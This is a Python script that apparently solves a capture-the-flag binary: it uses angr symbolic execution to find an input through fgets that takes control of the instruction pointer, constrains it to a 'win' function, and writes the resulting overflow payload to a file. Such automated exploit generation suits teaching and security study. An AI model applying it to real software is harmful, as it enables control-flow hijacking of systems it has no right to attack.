import angr
import claripy
import sys

def main(filename):
    proj = angr.Project(filename, auto_load_libs=False)

    # There's an fgets in main that reads 64 bytes from stdin.
    payload = [claripy.BVS(f"byte_{i}", 8) for i in range(64)]
    payload_ast = claripy.Concat(*payload + [claripy.BVV(b'\n')])

    st = proj.factory.full_init_state(
        args=[filename],
        add_options=angr.options.unicorn,
        stdin=payload_ast
    )

    # There aren't really any branches in the program, so let's just run it
    # until it terminates or reaches an unconstrained state.
    # ---
    # An unconstrained state occurs when we take control of the instruction
    # pointer, hence the "unconstrained" state of execution (we can go to
    # wherever we want).
    sm = proj.factory.simulation_manager(st, save_unconstrained=True)
    sm.run()

    # Take the first exploitable state that controls instruction pointer (for
    # this problem there's only one).
    ep = sm.unconstrained[0]
    pc = ep.regs.pc

    # Use the constraints solver to find a payload that sets $rip to the win
    # address, then save the payload to a file.
    win = proj.loader.find_symbol("win")
    ep.add_constraints(ep.regs.pc == win.linked_addr)
    payload_real = ep.solver.eval(payload_ast, cast_to=bytes)
    open(f"{filename}.exp", "wb").write(payload_real)
    print(f"[+] Wrote payload to {filename}.exp")

if __name__ == '__main__':
    main(sys.argv[1])
